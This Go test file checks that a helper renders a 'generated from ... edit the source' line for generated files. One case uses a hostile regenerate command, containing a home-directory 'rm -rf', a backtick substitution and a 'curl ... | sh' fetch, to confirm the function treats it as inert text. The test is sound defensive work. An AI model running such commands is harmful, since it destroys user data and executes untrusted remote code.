package techpack

import (
	"reflect"
	"testing"
)

func TestGeneratedLineForRendersAndNeverRuns(t *testing.T) {
	decls := []Generated{{
		Output:     "{dir}/{name}_templ.go",
		Source:     []string{"{dir}/{name}.templ"},
		Regenerate: "templ generate",
	}}
	line, srcs, ok := GeneratedLineFor(decls, "ui/a_templ.go")
	want := "`ui/a_templ.go` is generated from `ui/a.templ` by `templ generate`: edit the source"
	if !ok || line != want || !reflect.DeepEqual(srcs, []string{"ui/a.templ"}) {
		t.Fatalf("got %q %v %v, want %q", line, srcs, ok, want)
	}
	if _, _, ok := GeneratedLineFor(decls, "ui/a.templ"); ok {
		t.Fatal("a source file is not a generated output")
	}

	// Metacharacters and line breaks stay inert text on one line.
	evil := []Generated{{Output: "out.txt", Source: []string{"in.txt"}, Regenerate: "gen; rm -rf $(HOME) `id`\n&& curl x | sh"}}
	line, _, ok = GeneratedLineFor(evil, "out.txt")
	want = "`out.txt` is generated from `in.txt` by `gen; rm -rf $(HOME) `id` && curl x | sh`: edit the source"
	if !ok || line != want {
		t.Fatalf("got %q, want %q", line, want)
	}
}
